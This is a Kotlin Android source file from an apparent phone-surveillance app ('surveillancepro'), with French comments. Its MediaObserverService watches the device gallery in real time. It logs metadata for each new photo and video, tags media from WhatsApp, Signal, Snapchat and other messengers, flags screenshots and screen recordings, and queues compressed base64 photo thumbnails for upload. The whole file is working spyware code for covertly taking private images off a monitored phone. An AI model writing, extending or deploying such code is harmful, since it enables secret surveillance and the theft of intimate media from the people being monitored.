package com.surveillancepro.android.services

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Surveille en temps réel les nouvelles photos et vidéos ajoutées à la galerie.
 * Utilise ContentObserver sur MediaStore (zéro root requis).
 * Quand une nouvelle photo apparaît : la détecte, la compresse, l'enqueue pour sync.
 */
class MediaObserverService(private val context: Context) {

    private val handler = Handler(Looper.getMainLooper())
    private var imageObserver: ContentObserver? = null
    private var videoObserver: ContentObserver? = null
    private val prefs = context.getSharedPreferences("sp_media_obs", Context.MODE_PRIVATE)
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

    fun start() {
        val cr = context.contentResolver

        imageObserver = createObserver { detectNewImages() }
        cr.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, imageObserver!!
        )

        videoObserver = createObserver { detectNewVideos() }
        cr.registerContentObserver(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, videoObserver!!
        )

        Log.d(TAG, "Media observers registered")
    }

    fun stop() {
        imageObserver?.let { context.contentResolver.unregisterContentObserver(it) }
        videoObserver?.let { context.contentResolver.unregisterContentObserver(it) }
        handler.removeCallbacksAndMessages(null)
    }

    private fun createObserver(action: () -> Unit): ContentObserver {
        val debounceRunnable = Runnable { action() }
        return object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                handler.removeCallbacks(debounceRunnable)
                handler.postDelayed(debounceRunnable, 1500)
            }
        }
    }

    private fun detectNewImages() {
        val lastId = prefs.getLong("last_image_id", 0L)
        try {
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.MIME_TYPE,
                    MediaStore.Images.Media.RELATIVE_PATH,
                    MediaStore.Images.Media.WIDTH,
                    MediaStore.Images.Media.HEIGHT,
                ),
                "${MediaStore.Images.Media._ID} > ?",
                arrayOf(lastId.toString()),
                "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 5"
            ) ?: return

            val queue = EventQueue.getInstance(context)
            var maxId = lastId

            while (cursor.moveToNext()) {
                val id = cursor.getLong(0)
                val name = cursor.getString(1) ?: "photo"
                val dateAdded = cursor.getLong(2)
                val size = cursor.getLong(3)
                val mimeType = cursor.getString(4) ?: "image/jpeg"
                val path = cursor.getString(5) ?: ""
                val width = cursor.getInt(6)
                val height = cursor.getInt(7)

                if (id <= lastId) continue
                if (id > maxId) maxId = id

                val sourceApp = guessSourceApp(path, name)
                val isScreenshot = path.lowercase().contains("screenshot") ||
                        name.lowercase().contains("screenshot")

                queue.enqueue("new_photo_detected", mapOf(
                    "mediaId" to id,
                    "filename" to name,
                    "sizeBytes" to size,
                    "mimeType" to mimeType,
                    "path" to path,
                    "width" to width,
                    "height" to height,
                    "sourceApp" to sourceApp,
                    "isScreenshot" to isScreenshot,
                    "dateAdded" to dateFormat.format(Date(dateAdded * 1000)),
                    "timestamp" to dateFormat.format(Date()),
                ))

                // Compresser et enqueue la miniature pour upload
                if (size < 10 * 1024 * 1024) {
                    val thumbBase64 = generateThumbnail(id)
                    if (thumbBase64 != null) {
                        queue.enqueue("photo_thumbnail", mapOf(
                            "mediaId" to id,
                            "filename" to name,
                            "sourceApp" to sourceApp,
                            "isScreenshot" to isScreenshot,
                            "thumbnail" to thumbBase64,
                            "timestamp" to dateFormat.format(Date()),
                        ))
                    }
                }
            }
            cursor.close()
            if (maxId > lastId) prefs.edit().putLong("last_image_id", maxId).apply()
        } catch (e: Exception) {
            Log.w(TAG, "Image detection error: ${e.message}")
        }
    }

    private fun detectNewVideos() {
        val lastId = prefs.getLong("last_video_id", 0L)
        try {
            val cursor = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.DATE_ADDED,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DURATION,
                    MediaStore.Video.Media.MIME_TYPE,
                    MediaStore.Video.Media.RELATIVE_PATH,
                ),
                "${MediaStore.Video.Media._ID} > ?",
                arrayOf(lastId.toString()),
                "${MediaStore.Video.Media.DATE_ADDED} DESC LIMIT 5"
            ) ?: return

            val queue = EventQueue.getInstance(context)
            var maxId = lastId

            while (cursor.moveToNext()) {
                val id = cursor.getLong(0)
                val name = cursor.getString(1) ?: "video"
                val dateAdded = cursor.getLong(2)
                val size = cursor.getLong(3)
                val duration = cursor.getLong(4)
                val mimeType = cursor.getString(5) ?: "video/mp4"
                val path = cursor.getString(6) ?: ""

                if (id <= lastId) continue
                if (id > maxId) maxId = id

                val sourceApp = guessSourceApp(path, name)
                val isScreenRecord = path.lowercase().contains("screenrecord") ||
                        name.lowercase().contains("screenrecord")

                queue.enqueue("new_video_detected", mapOf(
                    "mediaId" to id,
                    "filename" to name,
                    "sizeBytes" to size,
                    "sizeMB" to String.format("%.1f", size / (1024.0 * 1024.0)),
                    "durationSeconds" to (duration / 1000),
                    "mimeType" to mimeType,
                    "path" to path,
                    "sourceApp" to sourceApp,
                    "isScreenRecord" to isScreenRecord,
                    "dateAdded" to dateFormat.format(Date(dateAdded * 1000)),
                    "timestamp" to dateFormat.format(Date()),
                ))
            }
            cursor.close()
            if (maxId > lastId) prefs.edit().putLong("last_video_id", maxId).apply()
        } catch (e: Exception) {
            Log.w(TAG, "Video detection error: ${e.message}")
        }
    }

    private fun guessSourceApp(path: String, filename: String): String {
        val p = path.lowercase()
        val f = filename.lowercase()
        return when {
            p.contains("whatsapp") -> "whatsapp"
            p.contains("telegram") -> "telegram"
            p.contains("instagram") -> "instagram"
            p.contains("snapchat") -> "snapchat"
            p.contains("messenger") || p.contains("facebook") -> "messenger"
            p.contains("signal") -> "signal"
            p.contains("dcim/camera") || p.contains("camera") -> "camera"
            p.contains("screenshot") || f.contains("screenshot") -> "screenshot"
            p.contains("download") -> "download"
            else -> "other"
        }
    }

    private fun generateThumbnail(imageId: Long): String? {
        return try {
            val uri = android.content.ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId
            )
            val bitmap = context.contentResolver.loadThumbnail(uri, android.util.Size(320, 320), null)
            val stream = ByteArrayOutputStream()
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, stream)
            Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Thumbnail generation failed: ${e.message}")
            null
        }
    }

    companion object {
        private const val TAG = "MediaObserverService"
    }
}
